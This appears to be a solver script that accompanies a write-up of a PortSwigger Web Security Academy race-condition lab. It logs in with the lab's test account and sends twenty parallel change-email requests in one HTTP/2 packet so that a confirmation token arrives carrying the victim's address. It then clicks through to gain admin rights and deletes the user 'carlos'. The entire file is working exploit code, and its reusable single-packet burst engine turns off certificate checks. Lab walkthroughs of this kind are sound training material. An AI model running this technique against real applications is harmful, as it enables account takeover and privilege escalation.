#!/usr/bin/env python3
"""
Single-endpoint race conditions
PortSwigger Web Security Academy -- Race Conditions

Companion script for the writeup: 04-single-endpoint-race-conditions.md

What this does:
    Fires twenty parallel POST /my-account/change-email requests at the same
    endpoint with different values -- ten targeting carlos@ginandjuice.shop,
    ten targeting throwaway addresses on our own exploit server -- built as
    one HTTP/2 single-packet burst with the same h2-based engine used for the
    limit-overrun lab. The vulnerability is a database race, not a session
    race: the change-email request updates a pending_email column, and a
    background email task reads that column back out (not the original
    request's own parameters) when it renders the confirmation email. If a
    carlos-targeted request overwrites that column after a throwaway
    request's update but before that throwaway request's email task renders,
    the email that goes out under the throwaway confirmation token contains
    carlos@ginandjuice.shop in its body. The script polls the email client,
    checks every returned message's BODY (not just its link) for that
    address, HTML-unescapes the confirmation link it finds, and clicks
    through. Some tokens from the burst come back already invalidated (400)
    by a later request in the same batch, so it retries the whole burst until
    a token comes back both valid and carrying the carlos body.

Usage:
    python 04-single-endpoint-race-conditions.py <lab-url>

Requirements:
    pip install httpx h2
"""

import html
import re
import socket
import ssl
import sys
import time
import urllib.parse

import httpx
import h2.config
import h2.connection
import h2.events

CARLOS_TARGET = "carlos@ginandjuice.shop"
CARLOS_REQUESTS = 10
THROWAWAY_REQUESTS = 10
MAX_ROUNDS = 15


def _csrf(html_text: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html_text)
    return m.group(1) if m else ""


def _h2_burst(host: str, port: int, requests: list[dict], timeout: float = 10.0) -> list[tuple[int, dict, bytes]]:
    """Same single-packet h2 engine as the limit-overrun lab: queue every
    HEADERS/DATA frame, flush with one sock.sendall(). Here each request in
    the burst carries a DIFFERENT body (different target email) to the SAME
    endpoint, which is what makes this a single-endpoint race rather than a
    limit-overrun one."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.create_connection((host, port), timeout=timeout)
    sock = ctx.wrap_socket(sock, server_hostname=host)
    if sock.selected_alpn_protocol() != "h2":
        sock.close()
        raise RuntimeError(f"Server does not support HTTP/2 (got: {sock.selected_alpn_protocol()})")

    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    stream_ids = []
    for req in requests:
        hdrs = [
            (":method", req.get("method", "POST")),
            (":path", req["path"]),
            (":authority", host),
            (":scheme", "https"),
        ]
        for k, v in req.get("headers", {}).items():
            hdrs.append((k.lower(), v))
        body = req.get("body", "").encode() if isinstance(req.get("body", ""), str) else req.get("body", b"")
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        if body:
            conn.send_headers(sid, hdrs, end_stream=False)
            conn.send_data(sid, body, end_stream=True)
        else:
            conn.send_headers(sid, hdrs, end_stream=True)

    sock.sendall(conn.data_to_send())

    responses: dict[int, dict] = {}
    done_streams = set()
    sock.settimeout(timeout)
    while len(done_streams) < len(stream_ids):
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for event in conn.receive_data(data):
            if isinstance(event, h2.events.ResponseReceived):
                sid = event.stream_id
                resp_headers = {
                    (k.decode() if isinstance(k, bytes) else k): (v.decode() if isinstance(v, bytes) else v)
                    for k, v in event.headers
                }
                responses.setdefault(sid, {"headers": {}, "data": b"", "status": 0})
                responses[sid]["status"] = int(resp_headers.get(":status", "0"))
                responses[sid]["headers"] = resp_headers
            elif isinstance(event, h2.events.DataReceived):
                sid = event.stream_id
                if sid in responses:
                    responses[sid]["data"] += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, sid)
            elif isinstance(event, (h2.events.StreamEnded, h2.events.StreamReset)):
                done_streams.add(event.stream_id)
        sock.sendall(conn.data_to_send())

    conn.close_connection()
    sock.sendall(conn.data_to_send())
    sock.close()

    result = []
    for sid in stream_ids:
        r = responses.get(sid, {"status": 0, "headers": {}, "data": b""})
        result.append((r["status"], r["headers"], r["data"]))
    return result


def _discover_exploit_domain(client: httpx.Client, lab_url: str) -> str:
    for path in ["/my-account", "/", "/login"]:
        r = client.get(f"{lab_url}{path}")
        m = re.search(r'(exploit-[^"\'<>\s]+\.exploit-server\.net)', r.text)
        if not m:
            m = re.search(r'(exploit-[^"\'<>\s]+\.web-security-academy\.net)', r.text)
        if m:
            return m.group(1).rstrip("/")
    return ""


def _find_carlos_confirmation_link(email_html: str) -> str | None:
    """The whole point of this race is that a token generated for one address
    can arrive with carlos's address printed in the message BODY -- so scan
    every link's surrounding text for the target address rather than trusting
    which inbox entry the link "belongs" to."""
    for m in re.finditer(r'href="([^"]+)"', email_html):
        link = m.group(1)
        window_start = max(0, m.start() - 400)
        window_end = min(len(email_html), m.end() + 400)
        context = email_html[window_start:window_end]
        if CARLOS_TARGET in context and ("confirm" in link.lower() or "email" in link.lower() or "token" in link.lower()):
            return html.unescape(link)
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    r = client.get(f"{lab_url}/login")
    csrf = _csrf(r.text)
    client.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

    exploit_domain = _discover_exploit_domain(client, lab_url)
    if not exploit_domain:
        print("[-] Could not discover the exploit server / email client domain.")
        return
    print(f"[*] Email client domain: {exploit_domain}")

    parsed = urllib.parse.urlparse(lab_url)
    host, port = parsed.hostname, parsed.port or 443
    session = client.cookies.get("session", "")

    for round_num in range(1, MAX_ROUNDS + 1):
        r = client.get(f"{lab_url}/my-account")
        csrf = _csrf(r.text)

        requests = []
        for _ in range(CARLOS_REQUESTS):
            requests.append({
                "method": "POST",
                "path": "/my-account/change-email",
                "headers": {
                    "content-type": "application/x-www-form-urlencoded",
                    "cookie": f"session={session}",
                },
                "body": f"csrf={csrf}&email={CARLOS_TARGET}",
            })
        for n in range(THROWAWAY_REQUESTS):
            throwaway = f"test{n}@{exploit_domain}"
            requests.append({
                "method": "POST",
                "path": "/my-account/change-email",
                "headers": {
                    "content-type": "application/x-www-form-urlencoded",
                    "cookie": f"session={session}",
                },
                "body": f"csrf={csrf}&email={throwaway}",
            })

        print(f"[*] Round {round_num}/{MAX_ROUNDS}: firing {len(requests)} change-email requests in one H2 packet...")
        _h2_burst(host, port, requests)

        time.sleep(2)
        email_page = client.get(f"https://{exploit_domain}/email")
        link = _find_carlos_confirmation_link(email_page.text)
        if not link:
            print("[-] No confirmation email with carlos's address in the body yet -- retrying")
            continue

        confirm_url = link if link.startswith("http") else f"{lab_url}{link}"
        confirm_resp = client.get(confirm_url)
        print(f"[*] Confirmation attempt: {confirm_resp.status_code}")
        if confirm_resp.status_code == 400:
            print("[-] Token already invalidated by a later request in the burst -- retrying")
            continue

        admin_r = client.get(f"{lab_url}/admin")
        if admin_r.status_code == 200 and "carlos" in admin_r.text:
            del_csrf = _csrf(admin_r.text)
            client.post(f"{lab_url}/admin/delete", data={"csrf": del_csrf, "username": "carlos"})

        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- inherited carlos's admin invite and deleted his account.")
            return
        print("[-] Confirmed an email but haven't solved yet -- retrying")

    print(f"[-] Not solved after {MAX_ROUNDS} rounds. Re-run -- the collision rate is roughly 1 in 10 per burst.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
